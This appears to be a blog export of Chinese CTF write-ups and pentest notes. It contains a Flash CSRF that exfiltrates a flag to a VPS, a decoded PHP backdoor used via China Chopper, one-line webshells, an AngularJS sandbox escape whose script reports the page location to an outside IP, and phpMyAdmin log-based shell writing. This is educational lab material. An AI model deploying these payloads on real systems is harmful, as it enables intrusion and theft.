&#39;utf-8&#39;payload={&#39;answer&#39;:&#39;c4ca4238a0b923820dcc509a6f75849b&#39;}q=s.post(url,data=payload)html=q.contenthtml_doc=str(html,&#39;utf-8&#39;)payload={&#39;answer&#39;:html_doc[160:192]}#返回的md5值q=s.post(url,data=payload)html=q.contenthtml_doc=str(html,&#39;utf-8&#39;)print(html_doc)</code></pre><p>flag{ef58f0b1e9437b4451248fb3f239622b}</p><h3 id="0x02简历来了"><a href="#0x02简历来了" class="headerlink" title="0x02简历来了"></a>0x02简历来了</h3><p>当时没做出来 再次复现的</p><p>题目的知识点：</p><p>1、csrf的原理</p><p>2、swf的文件头flash的检查</p><p>cws fws zws</p><h4 id="解析："><a href="#解析：" class="headerlink" title="解析："></a>解析：</h4><p>上传简历</p><p>php代码审计：</p><p>直接提交访问</p><pre><code class="php">&lt;?phprequire_once(&#39;init.php&#39;);header(&quot;Content-type: text/html; charset=utf-8&quot;);if(isset($_POST[&#39;submit&#39;])){    if(!z_validate_captcha()){        die(&#39;验证码错误&#39;);    }    $email = isset($_POST[&#39;email&#39;])?trim($_POST[&#39;email&#39;]):&#39;&#39;;    $url = isset($_POST[&#39;url&#39;])?trim($_POST[&#39;url&#39;]):&#39;&#39;;    $file = isset($_FILES[&#39;file&#39;])?$_FILES[&#39;file&#39;]:false;    if($email == false || $url == false || $file == false){        die(&#39;Invalid Input&#39;);    }    if(!filter_var($email, FILTER_VALIDATE_EMAIL)){        die(&#39;Invalid Email&#39;);    }    if(!filter_var($url, FILTER_VALIDATE_URL) || (strpos($url, &#39;http://&#39;) !== 0 &amp;&amp; strpos($url, &#39;https://&#39;) !== 0)){        die(&#39;Invalid URL&#39;);    }    if($file[&#39;error&#39;] || $file[&#39;size&#39;] &gt; 1024*1024 || !is_uploaded_file($file[&#39;tmp_name&#39;])){        die(&#39;Invalid File&#39;);    }    $ext = getExt($file[&#39;name&#39;]);    if(!in_array($ext, array(&#39;.jpg&#39;,&#39;.jpeg&#39;, &#39;.png&#39;, &#39;.docx&#39;, &#39;.doc&#39;))){        die(&#39;Invalid File Type&#39;);    }    $file_checked = false;    if(in_array($ext, array(&#39;.jpg&#39;,&#39;.jpeg&#39;, &#39;.png&#39;))){        $finfo = finfo_open(FILEINFO_MIME);        if (!$finfo) {            die(&quot;Opening fileinfo database failed&quot;);        }        $mime = finfo_file($finfo, $file[&quot;tmp_name&quot;]);        finfo_close($finfo);        if($mime == false){            die(&#39;Invalid Filename&#39;);        }        $arr = explode(&#39;;&#39;, $mime);        $mime = $arr[0];        if($mime == false || !in_array($mime, array(&#39;image/gif&#39;, &#39;image/jpeg&#39;, &#39;image/jpg&#39;, &#39;image/png&#39;, &#39;application/octet-stream&#39;))){            die(&#39;Invalid Filename&#39;);        }else{            $file_checked = true;        }    }elseif(in_array($ext, array(&#39;.docx&#39;, &#39;.doc&#39;))){        $finfo = finfo_open(FILEINFO_MIME);        if (!$finfo) {            die(&quot;Opening fileinfo database failed&quot;);        }        $mime = finfo_file($finfo, $file[&quot;tmp_name&quot;]);        finfo_close($finfo);        if($mime == false){            die(&#39;Invalid Filename&#39;);        }        $arr = explode(&#39;;&#39;, $mime);        $mime = $arr[0];        if($mime == false || !in_array($mime, array(&#39;application/msword&#39;,&#39;application/word&#39;, &#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document&#39;))){            die(&#39;Invalid Filename&#39;);        }else{            $file_checked = true;        }    }    if($file_checked !== true){        die(&#39;Invalid File Type&#39;);    }    $filename = &#39;./upload/&#39;.md5(mt_rand().microtime()).$ext;    move_uploaded_file($file[&quot;tmp_name&quot;], $filename);    if(!file_exists($filename)){        echo &#39;上传失败&#39;;    }else{        save_resume($email, $url, $filename);        echo &quot;&lt;br/&gt;提交成功：&quot;;        echo &quot;&lt;br/&gt;邮箱：&quot;.htmlspecialchars($email);        echo &quot;&lt;br/&gt;个人网站：&quot;.htmlspecialchars($url);        echo &quot;&lt;br/&gt;简历地址：&quot;.htmlspecialchars($filename);        echo &quot;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&quot;;    }}show_source(__FILE__);</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201807271711_417.png" alt=""></p><p><a href="http://101.71.29.5:10001/admin/index.php" target="_blank" rel="external">http://101.71.29.5:10001/admin/index.php</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807271711_670.png" alt=""></p><p>考虑知识点csrf 我们要模拟管理员去访问</p><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p><a href="http://www.freebuf.com/articles/web/35353.html" target="_blank" rel="external">Flash跨域数据劫持漏洞，一大波网站受影响</a><br><strong>object标签在包含flash文件时没有对嵌入的文件后缀进行判断。也就是说，只要文件内容包含了正常的flash文件代码，就能够被object标签成功加载并执行。</strong></p><p>flash文件有三种文件头：CWS FWS ZWS【最新的】<br>由于ZWS是新兴的文件格式，PHP暂不支持。</p><p>在php中，当解析cws,fws格式的文件的时候，会解析成 application/x-shockwave-flash;<br>但是当解析 zws 格式的文件时候，会解析成 application/octet-stream<br>从而绕过MIME限制。</p><p><strong>目录扫描发现<a href="http://101.71.29.5:10001/admin/中需要管理员权限才能看到flag。我们已知后台的爬虫会带着管理员的session_id来打开flag的页面，当后台的爬虫打开这个图像的时候。会跳转到我们的服务器地址，与此同时会加载object标签内嵌的flash，flash会利用CSRF打开http://101.71.29.5:10001/admin/将flag打回我们的服务器。" target="_blank" rel="external">http://101.71.29.5:10001/admin/中需要管理员权限才能看到flag。我们已知后台的爬虫会带着管理员的session_id来打开flag的页面，当后台的爬虫打开这个图像的时候。会跳转到我们的服务器地址，与此同时会加载object标签内嵌的flash，flash会利用CSRF打开http://101.71.29.5:10001/admin/将flag打回我们的服务器。</a></strong></p><h6 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h6><p><strong>其实这道题原理是最重要的，复现的话利用的是别人写的东西，没有什么太大意义。</strong></p><p>下载项目中的文件，将<code>ContentHijacking.swf</code>文件头改为ZWS然后后缀改为jpg上传到服务器，记录文件路径。<strong>(windows编辑器改的文件不能复现成功，某表哥说他windows上我软件全试过，没用。只有mac的hex friend可以，这就很奇怪了。)</strong></p><p>然后在<code>ContentHijackingLoader.html</code>125行加上你vps的地址，保存传到你的vps上。<br><a href="https://upload-images.jianshu.io/upload_images/9113969-bc47b3e7e188f0de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="external"><img src="https://upload-images.jianshu.io/upload_images/9113969-bc47b3e7e188f0de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></a></p><p>在你的vps上打开<code>ContentHijackingLoader.html</code>，第一个填写开始时候上传的jpg文件地址，下面填写要攻击的URL地址。然后生成payload。<br><a href="https://upload-images.jianshu.io/upload_images/9113969-a9a778bfc1351f30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="external"><img src="https://upload-images.jianshu.io/upload_images/9113969-a9a778bfc1351f30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></a></p><p>把payload写进个人网站提交，后台爬虫会访问这个payload。然后在你的vps日志里面就能看到打回来的<a href="http://101.71.29.5:10001/admin/%E4%B8%AD%E7%9A%84flag%E3%80%82" target="_blank" rel="external">http://101.71.29.5:10001/admin/中的flag。</a><br><a href="https://upload-images.jianshu.io/upload_images/9113969-becf6d50182c16e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="external"><img src="https://upload-images.jianshu.io/upload_images/9113969-becf6d50182c16e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x00-F5刷新"><a href="#0x00-F5刷新" class="headerlink" title="0x00 F5刷新"></a>0x00 F5刷新</h3><p>拿到一个图片一闪而过</p><p>根据提示想到F5刷新隐写</p><pre><code>首先下载F5解密的代码：https://github.com/matthewgao/F5-steganography切换到改目录下：cd F5-steganography继续运行命令：java Extract  E:\CTF\安恒月赛7\5b51807ba55b4\Misc.jpg然后会生成output.txt文件</code></pre><p>有密码</p><p>使用zipcenop打开看看可以解密</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807261455_536.png" alt=""></p><p>伪加密</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807261455_593.png" alt=""></p><p>实际上修改把01改成00就可</p><p>flag{96efd0a2037d06f34199e921079778ee}</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807242216_34.png" alt=""></p><h3 id="0x01-弱口令"><a href="#0x01-弱口令" class="headerlink" title="0x01 弱口令"></a>0x01 弱口令</h3><p>…. . .-.. .-.. —– ..-. — .-. ..- – </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807261343_275.png" alt=""></p><p>… . .-.. .-.. —– ..-. — .-. ..- —</p><p><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="external">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p><p>HELL0FORUM</p><p>图片拿出来 stegsolve感觉可能是lsb隐写</p><pre><code>python lsb.py extract 女神.png  1.txt 123456</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>墨者学院php代码审计1</title>
      <link href="/archives/8395d5c7/"/>
      <url>/archives/8395d5c7/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP代码分析溯源-第1题"><a href="#PHP代码分析溯源-第1题" class="headerlink" title="PHP代码分析溯源(第1题)"></a>PHP代码分析溯源(第1题)</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>某日，在某公司做IT维护的朋友给安全工程师”墨者”发了一个PHP文件，说在其WEB服务器发现多了一个b.php文件，目前不确定这个文件是开发留下的正常文件还是攻击者上传的木马后门，希望”墨者”能够帮他分析一下。 </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>访问<a href="http://219.153.49.228:45070/" target="_blank" rel="external">http://219.153.49.228:45070/</a></p><pre><code class="php">&lt;?php @$_++;$__=(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;`&quot;).(&quot;{&quot;^&quot;/&quot;);$___=(&quot;$&quot;^&quot;{&quot;).(&quot;~&quot;^&quot;.&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;-&quot;^&quot;~&quot;).(&quot;(&quot;^&quot;|&quot;);${$__}[!$_](${$___}[$_]); ?&gt;</code></pre><p>运行下，报错。 </p><p>$_ =&gt; 1</p><p>$__ =&gt; _GET</p><p>$___ =&gt; _POST</p><p>然后观察最后一行代码，把我们变量给用值替换进去</p><pre><code>${_GET}[!1](${_POST}[1]);</code></pre><p>把多余的{}去掉 [!1]也就是[0]，整理下代码是这样的</p><pre><code>$_GET[0]($_POST[1]);</code></pre><p>和一句话的</p><pre><code>$_POST[1]</code></pre><p>传参差不多了，那么</p><pre><code>$_GET[0]</code></pre><p>就是我们的函数名了</p><p>根据”b.php源码”提示去b.php目录下</p><p>用hackbar传GET和POST请求</p><p><a href="http://219.153.49.228:45070/b.php?0=assert" target="_blank" rel="external">http://219.153.49.228:45070/b.php?0=assert</a></p><p>1=phpinfo()</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807221443_103.png" alt=""></p><p>在菜刀里写<a href="http://219.153.49.228:45070/b.php?0=assert密码是1" target="_blank" rel="external">http://219.153.49.228:45070/b.php?0=assert密码是1</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807221450_724.png" alt=""></p><h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p>这里有一个问题在于</p><p><a href="http://219.153.49.228:45070/b.php?0=eval" target="_blank" rel="external">http://219.153.49.228:45070/b.php?0=eval</a></p><p>无法显示phpinfo</p><p>这里延伸出一个问题<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="external">柠檬大大的文章</a>解释的很好</p><p>问题出在</p><p><code>$_POST[&#39;1&#39;]()</code>这是一个<a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a>,这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括<strong>回调函数</strong>，函数表在内的一些用途。 </p><p>但是eval不能被可变函数 调用。 </p><blockquote><p><a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="external">mixed</a> <strong>eval</strong> ( string <code>$code</code> ) </p><p><strong>Note</strong>: 因为是一个语言构造器而不是一个函数，不能被 <a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a> 调用。 </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP字符串&#39;和“区别</title>
      <link href="/archives/d8be4236/"/>
      <url>/archives/d8be4236/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP字符串’和“区别"><a href="#PHP字符串’和“区别" class="headerlink" title="PHP字符串’和“区别"></a>PHP字符串’和“区别</h1><p>在PHP语言里，如果一个字符串是用单引号做定义的，</p><p>比如： <code>&#39;$demo&#39;</code>，那么不管这个字符串中间有什么，php都会原样输出。 而如果一个字符串用双引号做定义，那么，php在输出结果之前，先扫描这个字符串，如果遇到 <code>$</code>为开头的，会认为这是个变量，并尝试将 变量 的 值 替换这个变量后，输出。 </p><p>举例如下：      </p><pre><code>&lt;?php$mang0 = &#39;123&#39;;$demo =&quot;&lt;p&gt;ctf&lt;/p&gt; &lt;p&gt;$mang0&lt;/p&gt;&quot;;echo $demo;?&gt;</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201808252008_139.png" alt=""></p><p>遇到 <code>$mang0</code>为开头，寻找变量带入输出。</p><pre><code class="php">&lt;?php$mang0 = &#39;123&#39;;$demo =&#39;&lt;p&gt;ctf&lt;/p&gt; &lt;p&gt;$mang0&lt;/p&gt;&#39;;echo $demo;?&gt;</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201808252012_584.png" alt=""> </p><p>直接输出</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透测试基础</title>
      <link href="/archives/35d3b1d4/"/>
      <url>/archives/35d3b1d4/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试基础"><a href="#渗透测试基础" class="headerlink" title="渗透测试基础"></a>渗透测试基础</h1><h2 id="0x00熟悉各类名词"><a href="#0x00熟悉各类名词" class="headerlink" title="0x00熟悉各类名词"></a>0x00熟悉各类名词</h2><p>黑客：Hacker 黑客所做的不是恶意破坏，他们是一群纵横网络上的技术人员，热衷与科技探索、计算机科学研究。在IT圈中，Hacker一词无疑是带有正面意义的。<br>骇客：Cracker 骇客未必具有很高的技术，通常用一些简单的手段去达到一些炫耀、恶作剧、搞破坏的目的。<br>红客：Honcker Honcker用自己的技术维护国内网络安全，并对外来的一切进攻进行还击。他们拥有爱国、正义、进取的精神，是网络安全时代的英雄的代表。</p><p>白帽： 专门研究或者从事网络安全行业的人，通常受雇于各大安全公司，是提高网络、系统安全水平的主要力量。</p><p>黑帽： 专门研究木马、操作系统，寻找漏洞，并且以个人意志为出发点，攻击网络或者计算机。<br>灰帽： 以个人意志为出发点，两者皆可做。</p><h2 id="0x01术语词汇"><a href="#0x01术语词汇" class="headerlink" title="0x01术语词汇"></a>0x01术语词汇</h2><p>脚本(asp、php、jsp)<br>html(css、js、html)<br>HTTP协议<br>CMS(B/S)<br>MD5<br>肉鸡： 被黑客入侵并长期驻扎的计算机或服务器。<br>抓鸡： 利用使用量大的程序的漏洞，使用自动化方式获取。<br>Webshell： 通过Web入侵的一种脚本工具，可以据此对网站服务进行一定程度的控制。<br>漏洞: 硬件、软件、协议等等的可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等。</p><p>一句话木马： 通过向服务器端提交一句简短的代码，配合本地客户端实现webshell功能的木马。</p><p>&lt;%eval request(&quot;pass&quot;)%&gt;<br>&lt;%execute(request(&quot;pass&quot;))%&gt;<br>request(“pass”)：接收客户端提交的数据。pass为执行命令的参数。<br>eval/execute：函数执行客户端命令的内容。<br>提权： 操作系统低权限的账户将自己提升为管理员权限使用的方法。</p><p>后门： 黑客为了对住基金向长期的控制，在机器上种植的一段程序或者留下的一个“入口”。</p><p>跳板： 使用肉鸡IP来实施攻击其他目标，以便更好地隐藏自己的身份信息。</p><p>旁站入侵： 即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限。常见的旁站查询工具有：WebRobot、御剑、明小子和web在线查询等。</p><p>C段入侵： 即同C段下服务器入侵。如目标ip为192.168.1.253，入侵192.168.1.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。常用的工具有：在windows下有Cain，在UNIX环境下有Sniffit，Snoop，Tcpdump，Dsniff等。</p><p>C段技巧 :</p><p>1.扫描1-255全部网段的网站CMS情况<br>选择一款自己擅长入侵的cms，这样才能更快速的实现C段入侵<br>2.扫描1-255全部网段的端口开放情况<br>先查询端口，选择自己擅长提权的端口的网站来入侵，通过端口提权。使用到的工具椰树、阿D网络工具包</p><h2 id="0x02渗透测试"><a href="#0x02渗透测试" class="headerlink" title="0x02渗透测试"></a>0x02渗透测试</h2><p><strong>黑盒测试</strong>： 在未授权的情况下，模拟黑客的攻击方法和思维方式，来评估计算机网络系统可能存在的安全风险。 黑盒测试不同于黑客入侵，并不等于黑站。黑盒测试考验的是综合的能力（OS、Database、Script、code、思路、社工） 思路与经验积累往往决定成败。 三个臭皮匠赛过诸葛亮。<br><strong>白盒测试</strong> ： 相对黑盒测试，白鹤测试基本是从内部发起。 黑百合的另一种说法： 知道源代码和不知道源代码的渗透测试。 这时，黑盒测试还是传统的渗透测试，而白盒测试就偏向于代码审计。</p><p><strong>灰盒测试</strong>：基于白盒与黑盒测试之间的一种产物。 </p><p><strong>APT攻击</strong>：Advanced Persistent Threat 高级可持续性攻击，是指组织（特别是政府）或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。<br>1.极强的隐蔽性<br>2.潜伏期长，持续性强<br>3.目标性强<br><strong>渗透测试的特点：</strong><br>充满挑战与刺激——不达目的不罢休<br>思路与经验累计往往决定成败</p><p><strong>渗透测试与入侵的最大的区别：</strong><br>渗透测试：更全面的找出服务器的问题，更倾向于保护。<br>入侵：不择手段地（甚至是具有破坏性的）拿到权限。</p><h2 id="0x03渗透测试一般流程："><a href="#0x03渗透测试一般流程：" class="headerlink" title="0x03渗透测试一般流程："></a>0x03渗透测试一般流程：</h2><p>明确目标》信息收集》漏洞探测》漏洞验证》信息分析 》获取所需》信息整理》 形成报告</p><p>1.明确目标：<br>确定范围<br>确定规则<br>确定需求<br>2.信息收集：<br>基础信息<br>系统信息<br>应用信息<br>版本信息<br>服务信息<br>人员信息<br>防护信息<br>3.漏洞探测：<br>系统漏洞<br>WebServer漏洞<br>Web应用漏洞<br>其他端口服务漏洞<br>通信安全<br>4.漏洞验证：<br>自动化验证<br>手工验证<br>试验验证<br>登录猜解<br>业务漏洞验证<br>公开资源的利用<br>5.信息分析<br>精准打击<br>绕过防御机制<br>定制攻击路径<br>绕过检测机制<br>攻击代码<br>6.获取所需<br>实施攻击<br>获取内部信息<br>进一步渗透<br>持续性存在<br>清理痕迹<br>7.信息整理<br>整理渗透工具<br>整理收集信息<br>整理漏洞信息<br>8.形成报告：<br>按需整理<br>补充介绍<br>修补建议</p><p>经验分享<br>信息搜集是关键<br>做事不要太心急<br>多学习，多看源码<br>平时注意搜集0day<br>思路很重要</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>八月展望</title>
      <link href="/archives/80e1beed/"/>
      <url>/archives/80e1beed/</url>
      
        <content type="html"><![CDATA[<p>不要自己感动自己</p><p>不要过于享受生活</p><p>八月了，八月还会是如此的散漫自由么，生活确实不是一帆丰顺，社会上的尔虞吾诈也都心酸体验了一把。</p><p>八月了，希望自己静下心来，认真的做自己的计划，世界的另一番风景只有站的最够高才能看清，太低了琐事缠身，总想超脱，痛恨无能摆脱。</p><p>八月了，时间慢一点吧，目标定实际一点吧，能尽力碰到就好。人总是有些好高骛远，飞的太高太不真实，落下就残忍。</p><p>八月，祝能实现理想，静候佳音。完成flag。</p>]]></content>
      
      
      <categories>
          
          <category> 思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018SCTF-wp</title>
      <link href="/archives/f4e3f3ec/"/>
      <url>/archives/f4e3f3ec/</url>
      
        <content type="html"><![CDATA[<h1 id="sctf"><a href="#sctf" class="headerlink" title="sctf"></a>sctf</h1><p>被虐杀，web明年再战，感谢小组四人的努力，缺一个都是不完整的。加油！</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202236_554.png" alt=""></p><p>[TOC]</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><h3 id="侧信道初探"><a href="#侧信道初探" class="headerlink" title="侧信道初探"></a>侧信道初探</h3><p>以下图为例，使用 SPA 就可以从芯片的功耗曲线中可以读出十六进制的关键数据。<br><img src="https://i.imgur.com/yPJvv6u.png" alt="SPA图示"><br><img src="https://i.imgur.com/ogzPrtK.png" alt=""></p><p>SCTF{0110111010}</p><h3 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h3><p>modbus协议<br><img src="http://oy0tigw51.bkt.clouddn.com/201806191825_719.png" alt=""><br>接下来tcp流追踪<br>搜索sctf未果<br>继续慢慢寻找<br><img src="http://oy0tigw51.bkt.clouddn.com/201806191816_523.png" alt=""><br>SCTF{Easy_Mdbus}</p><p><img src="" alt="Uploading file..._wk2cyf491"></p><h3 id="神秘的交易"><a href="#神秘的交易" class="headerlink" title="神秘的交易"></a>神秘的交易</h3><p>logicdata拖进Logic里面,分析嗅探得到的波形图</p><p><img src="https://i.imgur.com/fvQUPGz.png" alt=""></p><p>0x400x310x10</p><p>SCTF{403110}</p><h3 id="肥宅快乐题"><a href="#肥宅快乐题" class="headerlink" title="肥宅快乐题"></a>肥宅快乐题</h3><p>使用硕思闪客精灵 反编译flash</p><p>在动作一栏寻找得到一段会话</p><p>得到</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202141_189.png" alt=""></p><p>U1lDe0YzaVpoYWlfa3U0aWxlX1QxMTF9</p><p>base64解码</p><p>SYC{F3iZhai_ku4ile_T111}</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="新的建议板"><a href="#新的建议板" class="headerlink" title="新的建议板"></a>新的建议板</h3><p>右键查看源码得到 AngularJS 版本1.4.6<br>模板注入<br><a href="https://www.anquanke.com/post/id/86093" target="_blank" rel="external">https://www.anquanke.com/post/id/86093</a><br><a href="http://seaii-blog.com/index.php/2017/09/02/68.html" target="_blank" rel="external">http://seaii-blog.com/index.php/2017/09/02/68.html</a></p><pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);eval(atob(`dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly8xNjUuMjI3LjU4LjEwOTo4ODg4Lz9sb2NhdGlvbj0nK2RvY3VtZW50LmxvY2F0aW9uLmhyZWY7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTs=`));alert(3);//');}}</code></pre><p>本地可以xss，vps收不到bot的请求</p><h3 id="easiest-web-phpmyadmin"><a href="#easiest-web-phpmyadmin" class="headerlink" title="easiest web - phpmyadmin"></a>easiest web - phpmyadmin</h3><p>参照了网上的文章利用日志的方法写入shell</p><p>思路：就是利用mysql的一个日志文件。这个日志文件每执行一个sql语句就会将其执行的保存。我们将这个日志文件重命名为我们的shell.php然后执行一条sql带一句话木马的命令。然后执行菜刀连接</p><p>首先查看本地的写shell地址</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202056_350.png" alt=""></p><p>SET global general_log_file=’D:/phpStu/WWW/shell.php’;</p><p>select “&lt;?php @eval($_POST[‘shell’]);?&gt;”; </p><p><img src="http://oxskavewj.bkt.clouddn.com/3nahv80ilqe61q1enu4zprhu59.png" alt=""></p><p>shell连上进入c盘获取flag</p><p><img src="http://oxskavewj.bkt.clouddn.com/2p45t2wakukp40nuieu4wv1q3e.png" alt=""></p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="Script-In-Script"><a href="#Script-In-Script" class="headerlink" title="Script In Script"></a>Script In Script</h3><p>本来想着写脚本爆破的，考虑到时间的原因采用了取巧的方法，因为flag的很多字符都是可以看代码写出来的，所以本地把js先解密了，搭了一个环境，根据js的变量值进行测试</p><p><img src="http://oxskavewj.bkt.clouddn.com/cgb8jdo2whkqex0ndrl65y2tq3.png" alt=""></p><p>flag:sctf{5cr1Pt_In_ScrIpT!!}</p><h3 id="Where-is-my-13th-count？"><a href="#Where-is-my-13th-count？" class="headerlink" title="Where is my 13th count？"></a>Where is my 13th count？</h3><p>题目要求是让白球吃到13个黄色方块得到13分，但是一共只有12个能吃<br>使用相关调试软件发现游戏会闪退，判断有反调试<br>根据suctf的一道题目</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202212_643.png" alt=""></p><p>分析Cheat Engine_Data\Managed下的Assembly-CSharp.dll文件，反调试都在这个dll文件下完成<br>发现了这些东西</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_821.png" alt=""></p><p>交叉分析找到反调试函数然后直接patch<br><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_351.png" alt=""><br>使用游戏辅助神器Cheat Engine修改游戏的分数内存即可<br><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_393.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_208.png" alt=""></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="it-may-contain-‘flag"><a href="#it-may-contain-‘flag" class="headerlink" title="it may contain ‘flag"></a>it may contain ‘flag</h3><p>低解密指数攻击</p><pre><code class="pp">import gmpy2import timedef continuedFra(x, y):    cF = []    while y:        cF += [x / y]        x, y = y, x % y    return cFdef Simplify(ctnf):    numerator = 0    denominator = 1    for x in ctnf[::-1]:        numerator, denominator = denominator, x * denominator + numerator    return (numerator, denominator)def calculateFrac(x, y):    cF = continuedFra(x, y)    cF = map(Simplify, (cF[0:i] for i in xrange(1, len(cF))))    return cFdef solve_pq(a, b, c):    par = gmpy2.isqrt(b * b - 4 * a * c)    return (-b + par) / (2 * a), (-b - par) / (2 * a)def wienerAttack(e, n):    for (d, k) in calculateFrac(e, n):        if k == 0: continue        if (e * d - 1) % k != 0: continue        phi = (e * d - 1) / k        p, q = solve_pq(1, n - phi + 1, n)        if p * q == n:            return abs(int(p)), abs(int(q))    print &#39;not find!&#39;time.clock()n = 0x1fb18fb44f4449f45ea938306c47b91f64b6c176bd24dbb35aa876f73859c90f0e1677d07430a1188176bc0b901ca7b01f6a99a7df3aec3dd41c3d80f0d17292e43940295b2aa0e8e5823ffcf9f5f448a289f2d3cb27366f907ee62d1aaeba490e892dc69dacbafa941ab7be809e1f882054e26add5892b1fcf4e9f1c443d93bfe = 0xe42a12145eaa816e2846200608080305c99468042450925789504307cbc54a20ed7071b68b067b703a1679d861795542f8cbd2d1cb4d3847d0940cac018cdb0fa729571afbe10c1b8be2dd8acd99ee48b77d53c435b9c2fed59e12e02ad8cfc2bcc46ad85534c266dcc1f3a1a03d87118eaf3f5b3eeeb3be84ad023a4bf34939c = 0xd19d63015bdcb0b61824237b5c67cb2ef09af0c6cd30e193ff9683357b1e45ab4df607b8c1e0b96cafc49a84d7e655c3ce0f71b1d217eec9ca6cdfa57dd3dc92533b79431aa8a7d6ca67ac9cdd65b178a5a96ab7ce7bf88440f4a9b9d10151b0c942a42fdab9ea2c2f0c3706e9777c91dcc9bbdee4b0fb7f5d3001719c1dd3d3p, q = wienerAttack(e, n)print &#39;[+]Found!&#39;print &#39;  [-]p =&#39;,pprint &#39;  [-]q =&#39;,qprint &#39;  [-]n =&#39;,p*qd = gmpy2.invert(e,(p-1)*(q-1))print &#39;  [-]d =&#39;, dprint &#39;  [-]m is:&#39; + &#39;{:x}&#39;.format(pow(c,d,n)).decode(&#39;hex&#39;)print &#39;\n[!]Timer:&#39;, round(time.clock(),2), &#39;s&#39;print &#39;[!]All Done!&#39;print n```</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cbc字节翻转攻击</title>
      <link href="/archives/2947d8f2/"/>
      <url>/archives/2947d8f2/</url>
      
